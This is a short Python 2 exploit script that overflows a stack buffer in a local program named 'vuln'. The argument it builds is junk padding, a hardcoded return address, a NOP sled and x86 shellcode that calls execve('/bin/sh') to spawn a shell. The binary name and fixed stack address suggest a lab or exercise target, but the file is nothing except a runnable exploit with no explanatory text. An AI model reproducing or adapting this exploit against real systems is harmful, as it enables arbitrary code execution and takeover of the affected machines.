import struct
from subprocess import call

arg1 = "vuln"

#Stack address where shellcode is copied.
ret_addr = 0xbffff590

#Spawn a shell
#execve(/bin/sh)
scode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

#endianess convertion
def conv(num):
 return struct.pack("<I",num)

# arg2 = Junk + RA + NOP's + Shellcode
arg2 = "A" * 24
arg2 += conv(ret_addr);
arg2 += "\x90" * 100
arg2 += scode
arg2 += "C" * 108

print "Calling vulnerable program"
call(["./vuln", arg1, arg2])
